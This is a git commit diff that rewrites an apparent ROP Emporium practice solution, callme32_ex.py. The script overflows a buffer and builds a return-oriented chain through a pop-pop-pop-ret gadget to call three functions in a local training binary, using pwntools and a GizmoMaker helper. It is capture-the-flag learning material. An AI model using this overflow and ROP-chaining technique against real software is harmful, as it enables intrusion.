1bd665217a2d176560869738c22ee65131dc3063
Clif Wolfe <clifwolfe1@gmail.com>
2019-03-20 12:17:12 -0400

    Updated to use GizmoMaker and pwn

--- rop_emporium/callme32_ex.py
+++ rop_emporium/callme32_ex.py
@@ -1,31 +1,36 @@
-#!/usr/bin/python2.7
-import struct;
-x=lambda a:struct.pack('<I', a);
 
-popx3_ret = 0x80488a9 # pop esi; pop edi; pop ebp; ret;
+import pwn
+from GizmoMaker import GizmoMaker
 
-payload = 'D'*40 # Fill buffer
-payload += 'BBBB' # EBP, junk
+popx3_ret = 0x80488a9  # pop esi; pop edi; pop ebp; ret;
+callme_one = 0x080485c0
+callme_two = 0x08048620
+callme_three = 0x080485b0
+gizmo_maker = GizmoMaker(packer=pwn.p32)
+template = gizmo_maker.get_template_template()
 
-payload += x(0x080485c0) # Address of callme_one (PLT) # info func callme
-payload += x(popx3_ret) # return address 
-# params
-payload += x(0x1) 
-payload += x(0x2)
-payload += x(0x3)
+template["name"] = "call_function"
+template["Constants"] = ["pop_addr", "1", "2", "3"]
+template["Parameters"] = ["function_addr"]
+template["Queue"] = ["function_addr",
+                     "pop_addr",
+                     "1", "2", "3"]
 
-payload += x(0x08048620) # callme_two
-payload += x(popx3_ret)
-payload += x(0x1)
-payload += x(0x2)
-payload += x(0x3)
+gizmo_maker.add_template(template)
+gizmo_maker.init_template("call_function", popx3_ret, 0x1, 0x2, 0x3)
 
-payload += x(0x080485b0) # callme_three
-payload += x(popx3_ret)
-payload += x(0x1)
-payload += x(0x2)
-payload += x(0x3)
+payload = ('D'*40).encode()  # Fill buffer
+payload += 'BBBB'.encode()  # EBP, junk
+payload += gizmo_maker.execute("call_function", callme_one)
+payload += gizmo_maker.execute("call_function", callme_two)
+payload += gizmo_maker.execute("call_function", callme_three)
+payload += '\n'.encode()
 
 
-print payload
+p = pwn.tubes.process.process(["./callme32"], shell=True)
+p.send_raw(payload)
+p.interactive()
+p.close()
+
+
 
